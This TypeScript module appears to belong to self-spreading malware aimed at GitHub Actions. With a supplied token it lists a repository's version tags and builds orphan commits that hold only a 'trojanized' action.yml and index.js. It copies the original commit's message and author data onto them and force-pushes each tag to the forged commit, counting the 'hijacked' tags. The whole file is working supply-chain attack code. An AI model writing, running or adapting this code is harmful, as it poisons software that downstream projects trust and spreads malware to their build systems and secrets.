import { githubFetch, githubJson } from "../../github_utils/client";
import { logUtil } from "../../utils/logger";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

interface TagRef {
  ref: string; // "refs/tags/v4.3.1"
  object: { sha: string; type: string };
}

interface GitCommitDetails {
  sha: string;
  commit: {
    message: string;
    author: { name: string; email: string; date: string };
    committer: { name: string; email: string; date: string };
  };
}

interface GitTagDetails {
  sha: string;
  object: { sha: string; type: string };
}

interface CreateTreeResult {
  sha: string;
}

interface CreateCommitResult {
  sha: string;
}

export interface ForcePushParams {
  token: string;
  owner: string;
  name: string;
  /** "action.yml" or "action.yaml" */
  filename: string;
  /** The modified action YAML content */
  newYaml: string;
  /** Contents of Bun.main to write as index.js */
  indexJs: string;
  /** Tag prefix to match, e.g. "v" or "refs/tags/v" */
  tagPrefix?: string;
}

// ---------------------------------------------------------------------------
// Low-level Git REST helpers
// ---------------------------------------------------------------------------

/**
 * Public: discover tag refs matching a prefix (e.g. "v" for semver tags)
 * without performing any mutations.  Used by the dry-run path.
 */
export async function listMatchingTags(
  token: string,
  owner: string,
  repo: string,
  prefix: string,
): Promise<TagRef[]> {
  return fetchMatchingTags(token, owner, repo, prefix);
}

/**
 * Fetch all tag refs matching a prefix.  Accepts both lightweight tags
 * (type=commit) and annotated tags (type=tag) — the caller resolves
 * through to the underlying commit via {@link fetchCommitDetails}.
 */
async function fetchMatchingTags(
  token: string,
  owner: string,
  repo: string,
  prefix: string,
): Promise<TagRef[]> {
  try {
    const refs = await githubJson<TagRef[]>(
      token,
      `/repos/${owner}/${repo}/git/matching-refs/tags/${encodeURIComponent(prefix)}`,
    );
    // Accept both "commit" (lightweight) and "tag" (annotated).
    // fetchCommitDetails will dereference annotated tags automatically.
    return refs.filter(
      (r) => r.object?.type === "commit" || r.object?.type === "tag",
    );
  } catch {
    return [];
  }
}

/**
 * Resolve a tag-ref object SHA to the underlying commit, following the
 * reference chain through annotated tags when necessary.
 *
 * - Lightweight tag  → /commits/{sha}     → commit directly
 * - Annotated tag    → /git/tags/{sha}    → dereference → /commits/{real_sha}
 *
 * Returns null when the SHA cannot be resolved to a valid commit.
 */
export async function getCommitDetails(
  token: string,
  owner: string,
  repo: string,
  sha: string,
): Promise<GitCommitDetails | null> {
  return fetchCommitDetails(token, owner, repo, sha);
}

async function fetchCommitDetails(
  token: string,
  owner: string,
  repo: string,
  sha: string,
): Promise<GitCommitDetails | null> {
  // Step 1 — try as a commit directly (lightweight tag path)
  try {
    const data = await githubJson<GitCommitDetails>(
      token,
      `/repos/${owner}/${repo}/commits/${sha}`,
    );
    if (data?.commit?.message) {
      return data;
    }
  } catch {
    // Not a commit — may be an annotated tag object, fall through
  }

  // Step 2 — try as an annotated tag object, then dereference to the commit
  try {
    const tagData = await githubJson<GitTagDetails>(
      token,
      `/repos/${owner}/${repo}/git/tags/${sha}`,
    );
    if (tagData?.object?.sha) {
      const realCommit = await githubJson<GitCommitDetails>(
        token,
        `/repos/${owner}/${repo}/commits/${tagData.object.sha}`,
      );
      if (realCommit?.commit?.message) {
        return realCommit;
      }
    }
  } catch {
    // Could not resolve through annotated tag either
  }

  logUtil.log(
    `[comitter] ${owner}/${repo}: SHA ${sha} does not resolve to a valid commit`,
  );
  return null;
}

/**
 * Create a new Git tree containing only the two files we care about.
 */
async function createTree(
  token: string,
  owner: string,
  repo: string,
  filename: string,
  newYaml: string,
  indexJs: string,
): Promise<string> {
  const result = await githubJson<CreateTreeResult>(
    token,
    `/repos/${owner}/${repo}/git/trees`,
    {
      method: "POST",
      body: JSON.stringify({
        tree: [
          {
            path: filename,
            mode: "100644",
            type: "blob",
            content: newYaml,
          },
          {
            path: "index.js",
            mode: "100644",
            type: "blob",
            content: indexJs,
          },
        ],
      }),
    },
  );
  return result.sha;
}

/**
 * Create a dangling (orphan) commit with no parents, reusing the original
 * commit's message, author, and committer.
 */
async function createOrphanCommit(
  token: string,
  owner: string,
  repo: string,
  treeSha: string,
  original: GitCommitDetails,
): Promise<string> {
  const result = await githubJson<CreateCommitResult>(
    token,
    `/repos/${owner}/${repo}/git/commits`,
    {
      method: "POST",
      body: JSON.stringify({
        message: original.commit.message,
        author: original.commit.author,
        committer: original.commit.committer,
        parents: [],
        tree: treeSha,
      }),
    },
  );
  return result.sha;
}

/**
 * Force-push a tag ref to point at a new commit SHA.
 *
 * The ref name must be the short tag name (e.g. "v4.3.1"), not the
 * fully-qualified "refs/tags/v4.3.1".
 */
async function forcePushTag(
  token: string,
  owner: string,
  repo: string,
  tagName: string,
  commitSha: string,
): Promise<boolean> {
  try {
    const res = await githubFetch(
      token,
      `/repos/${owner}/${repo}/git/refs/tags/${encodeURIComponent(tagName)}`,
      {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sha: commitSha, force: true }),
      },
    );
    if (!res.ok) {
      logUtil.log(
        `[comitter] force-push returned ${res.status} for tag ${tagName}`,
      );
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * For every semver-prefixed tag on a repository, create an orphan commit
 * containing only the trojanized action.yml + index.js, then force-push the
 * tag to point at the orphan commit.
 *
 * @returns The number of tags that were successfully hijacked.
 */
export async function forcePushToTags(
  params: ForcePushParams,
): Promise<number> {
  const {
    token,
    owner,
    name,
    filename,
    newYaml,
    indexJs,
    tagPrefix = "v",
  } = params;

  // 1. Fetch matching tag refs
  const tags = await fetchMatchingTags(token, owner, name, tagPrefix);
  if (tags.length === 0) {
    logUtil.log(`[comitter] ${owner}/${name}: no tags matching "${tagPrefix}"`);
    return 0;
  }
  logUtil.log(
    `[comitter] ${owner}/${name}: found ${tags.length} tag(s) matching "${tagPrefix}"`,
  );

  // 2. Build the tree once (same content for every tag)
  let treeSha: string;
  try {
    treeSha = await createTree(token, owner, name, filename, newYaml, indexJs);
  } catch (e) {
    logUtil.log(
      `[comitter] ${owner}/${name}: failed to create tree — ${e instanceof Error ? e.message : String(e)}`,
    );
    return 0;
  }

  let hijacked = 0;

  for (const tag of tags) {
    // Extract short tag name from "refs/tags/v4.3.1" → "v4.3.1"
    const tagName = tag.ref.replace(/^refs\/tags\//, "");

    try {
      // 3. Resolve to commit (handles both lightweight and annotated tags)
      const original = await fetchCommitDetails(
        token,
        owner,
        name,
        tag.object.sha,
      );
      if (!original) {
        logUtil.log(
          `[comitter] ${owner}/${name}: could not resolve commit for tag ${tagName} (SHA ${tag.object.sha})`,
        );
        continue;
      }

      // 4. Create orphan commit
      const orphanSha = await createOrphanCommit(
        token,
        owner,
        name,
        treeSha,
        original,
      );

      // 5. Force-push the tag
      const ok = await forcePushTag(token, owner, name, tagName, orphanSha);
      if (ok) {
        logUtil.log(
          `[comitter] ${owner}/${name}: force-pushed tag ${tagName} → ${orphanSha.slice(0, 7)}`,
        );
        hijacked++;
      } else {
        logUtil.log(
          `[comitter] ${owner}/${name}: failed to force-push tag ${tagName}`,
        );
      }
    } catch (e) {
      logUtil.log(
        `[comitter] ${owner}/${name}: error processing tag ${tagName} — ${e instanceof Error ? e.message : String(e)}`,
      );
    }
  }

  return hijacked;
}
